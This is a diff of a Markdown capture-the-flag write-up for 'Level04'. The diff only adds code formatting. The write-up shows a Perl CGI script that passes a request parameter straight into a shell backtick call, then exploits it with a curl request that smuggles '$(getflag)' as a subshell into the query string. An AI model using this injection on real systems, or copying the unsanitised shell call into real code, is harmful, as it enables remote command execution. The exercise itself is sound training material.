@@ -1,6 +1,7 @@
 ### Level04
 
 On our HOME we can see a pearl script:
+```pearl
     #!/usr/bin/perl
     # localhost:4747
     use CGI qw{param};
@@ -10,12 +11,13 @@ On our HOME we can see a pearl script:
       print `echo $y 2>&1`;
     }
     x(param("x"));`
+```
 
 The script takes a parameter and then prints it to the screen. We are also told that the result is accessible on localhost:4747.
 
 To get the flag, all we have to do is run a command of our choice through the script. 
 
-curl localhost:4747?x='$(getflag)'`
+`curl localhost:4747?x='$(getflag)'`
 
 Here we use a subshell to make the script run the getflag command. So we get the token :
 
